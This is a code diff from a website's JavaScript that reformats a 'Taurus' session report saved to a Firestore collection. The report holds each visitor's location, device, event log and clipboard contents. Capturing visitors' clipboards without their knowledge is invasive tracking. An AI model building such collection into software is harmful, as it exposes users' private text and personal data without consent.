@@ -1136,14 +1136,15 @@
                 await window.db.collection('messages').add({
                     name: "System Report", // Sender Name
                     email: "tracker@taurus.sys", // System Email
-                    message: `SESSION REPORT [${sessionID}]\n` +
-                        `--------------------------------\n` +
-                        `⏱ DURATION: ${duration} seconds\n` +
-                        `📍 EXIT PAGE: ${window.location.pathname}\n` +
-                        `🌍 GEO: ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
-                        `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
-                        `📋 CLIPBOARD ACTIVITY:\n${clipboardEntries || 'None'}\n\n` +
-                        `📝 EVENT LOG (Last 50):\n${eventLog || 'No events recorded'}`,
+                    message: `TAURUS // SESSION REPORT\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `SESSION\n${sessionID}\n` +
+                        `DURATION\n${duration} seconds\n` +
+                        `EXIT PAGE\n${window.location.pathname}\n` +
+                        `LOCATION\n${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
+                        `DEVICE\n${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
+                        `CLIPBOARD\n${clipboardEntries || 'None'}\n\n` +
+                        `EVENT LOG\n${eventLog || 'No events recorded'}`,
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                     status: 'new', // Mark as unread
                     type: 'report',
